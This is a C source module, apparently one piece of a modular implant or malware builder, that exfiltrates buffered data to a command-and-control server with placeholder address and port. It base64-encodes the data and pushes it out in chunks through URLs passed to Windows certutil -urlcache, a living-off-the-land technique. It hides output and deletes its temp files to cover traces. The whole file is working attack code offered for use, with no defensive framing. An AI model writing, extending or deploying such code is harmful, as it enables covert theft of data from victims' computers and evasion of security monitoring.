// chunk: exfil/certutil_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: exfiltrate, flush_to_c2
// note: LOLBin exfil via certutil -urlcache — base64 encodes data in URL

#ifndef CHUNK_CERTUTIL_LOLBIN
#define CHUNK_CERTUTIL_LOLBIN

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static void b64_encode(const char *in, DWORD in_len, char *out, DWORD out_sz) {
    static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    DWORD i = 0, o = 0;
    while (i < in_len && o + 4 < out_sz) {
        unsigned int v = (unsigned char)in[i++] << 16;
        if (i < in_len) v |= (unsigned char)in[i++] << 8;
        if (i < in_len) v |= (unsigned char)in[i++];
        out[o++] = t[(v >> 18) & 0x3F];
        out[o++] = t[(v >> 12) & 0x3F];
        out[o++] = (i > in_len + 1) ? '=' : t[(v >> 6) & 0x3F];
        out[o++] = (i > in_len) ? '=' : t[v & 0x3F];
    }
    out[o] = '\0';
}

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    if (!data || len == 0) return FALSE;
    char temp_dir[MAX_PATH], temp_file[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    snprintf(temp_file, MAX_PATH, "%s~diag_%lx.tmp", temp_dir, GetTickCount());

    HANDLE hf = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written;
    WriteFile(hf, data, len, &written, NULL);
    CloseHandle(hf);
    if (written != len) { DeleteFileA(temp_file); return FALSE; }

    char cmd[2048], discard[MAX_PATH];
    snprintf(discard, MAX_PATH, "%s~ce_%lx.tmp", temp_dir, GetTickCount());
    snprintf(cmd, sizeof(cmd),
             "cmd /c certutil -urlcache -split -f \"http://%s:%d/upload\" \"%s\" & del \"%s\"",
             ip, port, discard, discard);

    char out[256] = {0}; DWORD out_len = 0;

    DWORD chunk_sz = 4096;
    DWORD offset = 0;
    while (offset < len) {
        DWORD this_len = (len - offset > chunk_sz) ? chunk_sz : (len - offset);
        char *b64 = (char *)malloc(this_len * 2 + 16);
        if (!b64) break;
        b64_encode(data + offset, this_len, b64, this_len * 2 + 16);

        snprintf(cmd, sizeof(cmd),
                 "cmd /c certutil -urlcache -split -f \"http://%s:%d/?d=%s\" \"%s\" >nul 2>&1 & del \"%s\" >nul 2>&1",
                 ip, port, b64, discard, discard);
        run_cmd(cmd, out, sizeof(out), &out_len);
        free(b64);
        offset += this_len;
    }

    DeleteFileA(temp_file);
    return TRUE;
}

static void flush_to_c2(void) {
    if (g_pos > 0) {
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
        g_pos = 0;
    }
}

#endif
